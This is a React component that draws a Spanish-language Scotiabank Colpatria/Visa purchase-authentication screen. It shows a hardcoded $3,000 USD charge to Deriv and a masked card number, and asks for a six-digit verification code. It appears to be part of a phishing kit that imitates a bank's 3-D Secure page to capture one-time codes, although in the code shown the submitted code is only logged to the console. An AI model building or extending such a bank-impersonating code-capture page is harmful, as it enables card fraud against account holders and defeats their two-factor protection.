import React, { useState } from 'react';
import "./ColpatriaOTP.css";
import visaLogo from "../img/Visa_logo.webp";
import logoColpatria from "../img/DaviBank.webp";

// User: Place your Colpatria logo here
// import colpatriaLogo from './img/colpatria-logo.png';

const ColpatriaOTP = () => {
  const [otp, setOtp] = useState('');

  const handleSubmit = (e) => {
    e.preventDefault();
    console.log('Colpatria OTP Submitted:', otp);
  };

  return (
    <div className="colpatria-otp-container">
      <div className="colpatria-otp-card">
        {/* Close Button */}
        <button
          className="colpatria-otp-close"
          onClick={() => console.log('Cerrar')}
          title="Cerrar"
        >
          X
        </button>

        {/* Header with Logos */}
        <div className="colpatria-otp-header">
          <div className="colpatria-logo">
            <img src={logoColpatria} alt="Scotiabank Colpatria" className="colpatria-logo-img" />
          </div>
          <div className="visa-logo">
            <img src={visaLogo} alt="VISA" className="visa-logo-img" />
          </div>
        </div>

        {/* Body Content */}
        <div className="colpatria-otp-body">
          <h2 className="colpatria-otp-title">Autenticación de compra</h2>

          <div className="colpatria-otp-description">
            <p>Le hemos enviado un código de verificación a su Text - (###)-###-5480.</p>
            <p>Este código es de uso personal, por seguridad no lo comparta con terceros.</p>
            <p>
              Usted esta autorizando un pago a <strong>Deriv/deriv.com</strong> por <strong>$3,000.00 USD</strong> el <strong>11/04/2025</strong> con tu tarjeta <strong>************5896</strong>.
            </p>
          </div>

          <form onSubmit={handleSubmit} className="colpatria-otp-form">
            <label className="colpatria-otp-label">Código de Verificación</label>
            <input
              type="text"
              className="colpatria-otp-input"
              maxLength={6}
              value={otp}
              onChange={(e) => setOtp(e.target.value.replace(/\D/g, ''))}
              placeholder=""
              autoFocus
            />

            <button type="submit" className="colpatria-otp-submit">
              ENVIAR
            </button>
          </form>

          {/* Links */}
          <div style={{ textAlign: 'center' }}>
            <button
              className="colpatria-otp-resend"
              onClick={() => console.log('Pedir otro código')}
            >
              PEDIR OTRO CODIGO
            </button>
          </div>
        </div>
      </div>
    </div>
  );
};

export default ColpatriaOTP;
